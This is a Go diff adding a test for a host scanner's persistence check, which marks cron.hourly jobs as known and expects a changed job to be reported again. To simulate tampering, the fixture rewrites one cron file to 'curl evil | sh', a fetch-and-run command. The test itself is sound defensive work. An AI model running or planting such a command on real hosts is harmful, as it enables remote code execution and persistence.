@@ -122,3 +122,48 @@ func TestOwnedFilesRPM(t *testing.T) {
 		t.Fatalf("%v %v", owned, err)
 	}
 }
+
+// Scheduled tasks marked as known stop being reported until they change.
+func TestPersistMarkedKnown(t *testing.T) {
+	h := testhost.New(t)
+	os.MkdirAll(filepath.Join(h.Base, "etc/cron.hourly"), 0o755)
+	os.MkdirAll(filepath.Join(h.Base, h.Env.Cfg.StateDir), 0o700)
+	os.WriteFile(filepath.Join(h.Base, "etc/cron.hourly/fstrim"), []byte("fstrim -a\n"), 0o755)
+	os.WriteFile(filepath.Join(h.Base, "etc/cron.hourly/free"), []byte("free\n"), 0o755)
+	r := Scan(t.Context(), h.Env, map[string]bool{}, time.Now())
+	scanner.mu.Lock()
+	saved := scanner.latest
+	scanner.latest = &r
+	scanner.mu.Unlock()
+	defer func() { scanner.mu.Lock(); scanner.latest = saved; scanner.mu.Unlock() }()
+	check := func() Check {
+		for _, c := range hostScanChecks(h.Env, &r, false) {
+			if c.ID == "host_persistence" {
+				return c
+			}
+		}
+		t.Fatal("no host_persistence check")
+		return Check{}
+	}
+	if c := check(); c.Status == "pass" || c.Fix != "apply" || !strings.Contains(c.Detail, "/etc/cron.hourly/fstrim") {
+		t.Fatalf("before: %+v", c)
+	}
+	marked, err := MarkPersistKnown(h.Env, false)
+	if err != nil || len(marked) < 2 {
+		t.Fatalf("marked %v, %v", marked, err)
+	}
+	if c := check(); c.Status != "pass" || c.Fix != "undo" || !strings.Contains(c.Detail, "marked as known") {
+		t.Fatalf("after marking: %+v", c)
+	}
+	// Changed since: reported again.
+	os.WriteFile(filepath.Join(h.Base, "etc/cron.hourly/free"), []byte("curl evil | sh\n"), 0o755)
+	if c := check(); c.Status == "pass" || !strings.Contains(c.Detail, "/etc/cron.hourly/free") || strings.Contains(c.Detail, "fstrim") {
+		t.Fatalf("changed file not reported again: %+v", c)
+	}
+	if _, err := MarkPersistKnown(h.Env, true); err != nil {
+		t.Fatal(err)
+	}
+	if c := check(); !strings.Contains(c.Detail, "fstrim") {
+		t.Fatalf("forgetting kept the marks: %+v", c)
+	}
+}
